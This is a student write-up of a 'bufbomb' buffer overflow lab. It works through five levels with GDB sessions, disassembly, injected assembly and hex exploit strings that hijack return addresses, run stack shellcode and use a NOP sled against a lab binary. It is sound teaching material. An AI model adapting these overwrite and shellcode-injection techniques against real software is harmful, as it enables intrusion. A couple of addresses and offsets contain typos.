# Buffer Overflow lab

## Info
* use GDB debugger
```
gdb ./bufbomb
(gdb) tui enable
(gdb) tui next // 4 times
(gdb) b (function name)
(gdb) run -u (student-number) < (raw txt file)
(gdb) nexti // check codes and registers
```
* Cookie - 0x79caf7f0

Basic idea of buffer overflow lab is when <test\> call <getbuf\> and <getbuf\> call <Gets\>, we input string which exceed buffer size. This string exploit the stack, then we can call other function or do new instruction which we input.
level 0 and level 1 are just manipulating return address that already exist as function. level 2 and level 3 are more complicated. we make some instruction to solve them, and return address is our instruction string(in stack), not the function.

### level 0: Candle
* smoke address: 0x08048c18
```
08048c18 <smoke>:
 8048c18:	55                   	push   %ebp
 8048c19:	89 e5                	mov    %esp,%ebp
 8048c1b:	83 ec 18             	sub    $0x18,%esp
 8048c1e:	c7 04 24 5f a3 04 08 	movl   $0x804a35f,(%esp)
 8048c25:	e8 66 fc ff ff       	call   8048890 <puts@plt>
 8048c2a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048c31:	e8 ae 06 00 00       	call   80492e4 <validate>
 8048c36:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048c3d:	e8 7e fc ff ff       	call   80488c0 <exit@plt>
```
```./level0/smoke-test.txt``` is 44 bytes ascending order text file to check buffer overflow, and ```./level0/test-raw.txt``` is just make this file to raw file using ```hex2raw```.
```
./level0/smoke-test.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
70 71 72 73
```
Executing bufbomb in gdb, input ```./level0/test-raw.txt``` file, it says 
> cannot access memory at address 0x73727170  

so in this case, "70 71 72 73" in string is exploited return address. so change these bytes to smoke address can call smoke function.
```
./level0/smoke.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
18 8c 04 08 
 ```


## level 1: Sparkler

* fizz address: 0x08048c42
```
08048c42 <fizz>:
 8048c42:	55                   	push   %ebp
 8048c43:	89 e5                	mov    %esp,%ebp
 8048c45:	83 ec 18             	sub    $0x18,%esp
 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
 8048c4b:	8b 55 0c             	mov    0xc(%ebp),%edx
 8048c4e:	89 c1                	mov    %eax,%ecx
 8048c50:	f7 d1                	not    %ecx
 8048c52:	c1 e1 08             	shl    $0x8,%ecx
 8048c55:	23 0d 28 d1 04 08    	and    0x804d128,%ecx
 8048c5b:	39 d1                	cmp    %edx,%ecx
 8048c5d:	75 2a                	jne    8048c89 <fizz+0x47>
 8048c5f:	89 54 24 0c          	mov    %edx,0xc(%esp)
 8048c63:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048c67:	c7 44 24 04 c8 a1 04 	movl   $0x804a1c8,0x4(%esp)
 8048c6e:	08 
 8048c6f:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048c76:	e8 e5 fc ff ff       	call   8048960 <__printf_chk@plt>
 8048c7b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048c82:	e8 5d 06 00 00       	call   80492e4 <validate>
 8048c87:	eb 1c                	jmp    8048ca5 <fizz+0x63>
 8048c89:	89 54 24 0c          	mov    %edx,0xc(%esp)
 8048c8d:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048c91:	c7 44 24 04 ec a1 04 	movl   $0x804a1ec,0x4(%esp)
 8048c98:	08 
 8048c99:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048ca0:	e8 bb fc ff ff       	call   8048960 <__printf_chk@plt>
 8048ca5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048cac:	e8 0f fc ff ff       	call   80488c0 <exit@plt>
 ```
In level0, the return address part in string is 41 to 44 bytes. So change smoke address to fizz address and add some bytes to check what's going on in fizz.
```
level1/fizz-test.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
42 8c 04 08
70 71 72 73
74 75 76 77
78 79 80 81
 ```
Executing bufbomb in gdb, input ```./level1/test-raw.txt``` file, it says
```
eax 0x77767574          // which is from 0x8(%ebp)
edx 0x81807978          // which is from 0xc(%ebp)
```
In fizz, move eax to ecx and do some operation on ecx. After these operation, 0x77767574 change to 0x98a8300. Changed value depends on your cookie and input string. You can easily check the exact value using GDB, doing step by step instruction and watching registers. so we replace "78 79 80 81" to "00 83 8a 09". Then, we can pass the jne instruction at 0x8045c5d.
```
level1/fizz.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
42 8c 04 08
70 71 72 73
74 75 76 77
00 83 8a 09
```

## level 2: Firecracker

* bang address: 0x08048cb1
```
08048cb1 <bang>:
 8048cb1:	55                   	push   %ebp
 8048cb2:	89 e5                	mov    %esp,%ebp
 8048cb4:	83 ec 18             	sub    $0x18,%esp
 8048cb7:	a1 20 d1 04 08       	mov    0x804d120,%eax
 8048cbc:	8b 15 28 d1 04 08    	mov    0x804d128,%edx
 8048cc2:	81 e2 0f 0f 00 00    	and    $0xf0f,%edx
 8048cc8:	39 d0                	cmp    %edx,%eax
 8048cca:	75 26                	jne    8048cf2 <bang+0x41>
 8048ccc:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048cd0:	c7 44 24 04 14 a2 04 	movl   $0x804a214,0x4(%esp)
 8048cd7:	08 
 8048cd8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048cdf:	e8 7c fc ff ff       	call   8048960 <__printf_chk@plt>
 8048ce4:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
 8048ceb:	e8 f4 05 00 00       	call   80492e4 <validate>
 8048cf0:	eb 18                	jmp    8048d0a <bang+0x59>
 8048cf2:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048cf6:	c7 44 24 04 7a a3 04 	movl   $0x804a37a,0x4(%esp)
 8048cfd:	08 
 8048cfe:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048d05:	e8 56 fc ff ff       	call   8048960 <__printf_chk@plt>
 8048d0a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048d11:	e8 aa fb ff ff       	call   80488c0 <exit@plt>
```
First, just exploit the return address to bang, like level 0 or 1.
```
./level2/fire-test1.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
b1 8c 04 08
```
Then using GDB, at bang cmp part you can see
```
eax 0x0
edx 0x700
```
eax is the global_value and edx is ```cookie & 0xf0f``` value. So in this level, we have to modify global_value to 0x700. The key to solve this problem is adding instruction and run in by returning this address.
In previous level, we put return address in 41 to 44 bytes in string. If we exploit stack, that place is the stack's return address part. So 45 to 48 bytes is ```0x4(%esp)``` part and if we input our instruction after return address part in string, then our return address should be ```0x4(%esp)``` address. To check this address, run ./bufbomb without input and break at getbuf. At ret instruction in getbuf function, you can see
```
esp 0x556833f4
```
So return address of our exploit string is "f8 33 68 55".
Our Instruction include move value to memory, push bang's address, return.
```
./level2/fire.s
movl $0x700, 0x0804d120
pushl $0x8048cb1
ret
```
compile and disassembling this file, you can get a disasembled file below.
```
gcc -m32 -c @targetfire.s
objdump -d @targetfire.o > @targetfile.d
```
```
./level2/fire.d

fire.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	c7 05 20 d1 04 08 00 	movl   $0x700,0x804d120
   7:	07 00 00 
   a:	68 b1 8c 04 08       	push   $0x8048cb1
   f:	c3                   	ret    

```
Adding this bytes to exploit string.
```
./level2/fire.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
f8 33 68 55
c7 05 20 d1 04 08 00 07 00 00 68 b1 8c 04 08 c3
```

## level 3: Dynamite

```
08048ea8 <test>:
 8048ea8:	55                   	push   %ebp
 8048ea9:	89 e5                	mov    %esp,%ebp
 8048eab:	83 ec 28             	sub    $0x28,%esp
 8048eae:	e8 db ff ff ff       	call   8048e8e <uniqueval>
 8048eb3:	89 45 f0             	mov    %eax,-0x10(%ebp)
 8048eb6:	8d 45 f4             	lea    -0xc(%ebp),%eax
 8048eb9:	89 04 24             	mov    %eax,(%esp)
 8048ebc:	e8 eb fe ff ff       	call   8048dac <getbuf>
 8048ec1:	e8 c8 ff ff ff       	call   8048e8e <uniqueval>
 8048ec6:	8b 55 f0             	mov    -0x10(%ebp),%edx
 8048ec9:	39 d0                	cmp    %edx,%eax
 8048ecb:	74 0e                	je     8048edb <test+0x33>
 8048ecd:	c7 04 24 3c a2 04 08 	movl   $0x804a23c,(%esp)
 8048ed4:	e8 b7 f9 ff ff       	call   8048890 <puts@plt>
 8048ed9:	eb 49                	jmp    8048f24 <test+0x7c>
 8048edb:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048ede:	3b 05 28 d1 04 08    	cmp    0x804d128,%eax
 8048ee4:	75 26                	jne    8048f0c <test+0x64>
 8048ee6:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048eea:	c7 44 24 04 b4 a3 04 	movl   $0x804a3b4,0x4(%esp)
 8048ef1:	08 
 8048ef2:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048ef9:	e8 62 fa ff ff       	call   8048960 <__printf_chk@plt>
 8048efe:	c7 04 24 03 00 00 00 	movl   $0x3,(%esp)
 8048f05:	e8 da 03 00 00       	call   80492e4 <validate>
 8048f0a:	eb 18                	jmp    8048f24 <test+0x7c>
 8048f0c:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048f10:	c7 44 24 04 d1 a3 04 	movl   $0x804a3d1,0x4(%esp)
 8048f17:	08 
 8048f18:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048f1f:	e8 3c fa ff ff       	call   8048960 <__printf_chk@plt>
 8048f24:	c9                   	leave  
 8048f25:	c3                   	ret   
 ```
This level, we go back to <test\> function and call <validate\> at address 0x8048f05, then quit the program normally. So, first, we have to check compare instruction in <test\> to modify our memory. In address 0x8048ede, register eax value is compared with cookie so we move our cookie to eax. Then we can pass the jne instruction, call validate, go leave and return.
So make assembly code like below.
```
./level3/dyn.s
movl $0x79caf7f0, %eax
pushl $0x08048ede
ret
 ```
disassembled file below.
```
./level3/dyn.o
dyn.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	b8 f0 f7 ca 79       	mov    $0x79caf7f0,%eax
   a:	68 de 8e 04 08       	push   $0x8048ede
   f:	c3                   	ret    
```
so our text file is
```
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
f8 33 68 55
b8 f0 f7 ca 79 68 de 8e 04 08 c3
```
when run this file, we can see VALID but then at leave Segmentation fault called because of violated ebp. So check the ebp at first of <test\>.
```
ebp 0x55683420
```
we have two option to solve this level. First one is just replace the ebp part of string like below.
```
./level3/dynamite-1.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
20 34 68 55
f8 33 68 55
b8 f0 f7 ca 79 68 de 8e 04 08 c3
```
Second one is make assembly code to move 0x55683420 to ebp like below
```
./level3/dyn.s
movl $0x79caf7f0, %eax
movl $0x55683420, %ebp
pushl $0x08048ede
ret

./level3/dyn.d

dyn.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	b8 f0 f7 ca 79       	mov    $0x79caf7f0,%eax
   5:	bd 20 34 68 55       	mov    $0x55683420,%ebp
   a:	68 de 8e 04 08       	push   $0x8048ede
   f:	c3                   	ret    

./level3/dynamite-2.txt
30 31 32 33
34 35 36 37
38 39 40 41
42 43 44 45
46 47 48 49
50 51 52 53
54 55 56 57
58 59 60 61
62 63 64 65
66 67 68 69
f8 33 68 55
b8 f0 f7 ca 79 bd 20 34 68 55 68 de 8e 04 08 c3
```

## level4: Nitroglycerin

In this level, we execute bufbomb in nitro mode by passing arguments -n when run.
```
cat exploit.txt | ./hex2raw | ./bufbomb -nu (student number)
```
In nitro mode, we call <testn\> and <getbufn\> rather than <test\> and <getbuf\>. As you can expect by its name, we call these 5 times, and each time it's address varies within the range of 240.

```
08048dfd <getbufn>:
 8048dfd:	55                   	push   %ebp
 8048dfe:	89 e5                	mov    %esp,%ebp
 8048e00:	81 ec 18 02 00 00    	sub    $0x218,%esp
 8048e06:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8048e0c:	89 04 24             	mov    %eax,(%esp)
 8048e0f:	e8 02 ff ff ff       	call   8048d16 <Gets>
 8048e14:	b8 01 00 00 00       	mov    $0x1,%eax
 8048e19:	c9                   	leave  
 8048e1a:	c3                   	ret    


08048e1b <testn>:
 8048e1b:	55                   	push   %ebp
 8048e1c:	89 e5                	mov    %esp,%ebp
 8048e1e:	83 ec 28             	sub    $0x28,%esp
 8048e21:	c7 45 f4 ef be ad de 	movl   $0xdeadbeef,-0xc(%ebp)
 8048e28:	e8 d0 ff ff ff       	call   8048dfd <getbufn>
 8048e2d:	8b 55 f4             	mov    -0xc(%ebp),%edx
 8048e30:	81 fa ef be ad de    	cmp    $0xdeadbeef,%edx
 8048e36:	74 0e                	je     8048e46 <testn+0x2b>
 8048e38:	c7 04 24 3c a2 04 08 	movl   $0x804a23c,(%esp)
 8048e3f:	e8 4c fa ff ff       	call   8048890 <puts@plt>
 8048e44:	eb 46                	jmp    8048e8c <testn+0x71>
 8048e46:	3b 05 28 d1 04 08    	cmp    0x804d128,%eax
 8048e4c:	75 26                	jne    8048e74 <testn+0x59>
 8048e4e:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048e52:	c7 44 24 04 68 a2 04 	movl   $0x804a268,0x4(%esp)
 8048e59:	08 
 8048e5a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048e61:	e8 fa fa ff ff       	call   8048960 <__printf_chk@plt>
 8048e66:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
 8048e6d:	e8 72 04 00 00       	call   80492e4 <validate>
 8048e72:	eb 18                	jmp    8048e8c <testn+0x71>
 8048e74:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048e78:	c7 44 24 04 98 a3 04 	movl   $0x804a398,0x4(%esp)
 8048e7f:	08 
 8048e80:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048e87:	e8 d4 fa ff ff       	call   8048960 <__printf_chk@plt>
 8048e8c:	c9                   	leave  
 8048e8d:	c3                   	ret   
 ```
Solution of this level is similar to level 3. But each time it's address varies, first we have to check the address list. At address 0x8048e06, you can see the buffer size expanded and eax start from (%ebp - 0x208). So check the address at (%ebp - 0x208) at the end of <getbuf\n>.
```
1
55683218
2
55683278
3
556831f8
4
55683278
5
55683218
 ```
In my case, the biggest address number is 55683278 and the smallest address number is 556831f8. Stack grows downward, so if we insert nop instruction in buffer and return to our buffer when <getbufn\> ends, it goes to down until other instruction came out. So if we use the biggest address, it will always execute our instruction. 
For making exploit string, check the buffer size and where we input our return address using ```./level4/nit-test.txt```. Then we can find that 524 to 528 bytes will be return address at stack. After that, make assembly file like below.
```
./level4/nit.s
lea 0x28(%esp), %ebp
movl $0x79caf7f0, %eax
pushl $0x08048e46
ret
./level4/nit.d

nit.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 f0 f7 ca 79       	mov    $0x79caf7f0,%eax
   9:	68 46 8e 04 08       	push   $0x8048e46
   e:	c3                   	ret    

```
Because each time memory change, we have to give memory-relative address to ebp so first line of assembly code is from <testn\>. using this object code, make our string like below.
```
./level4/nitroglycerin.txt
90 90 90 90
...
90 90 90 90
90 8d 6c 24 28 b8 f0 f7 ca 79 68 46 8e 04 08 c3
78 32 68 55
```
then it works.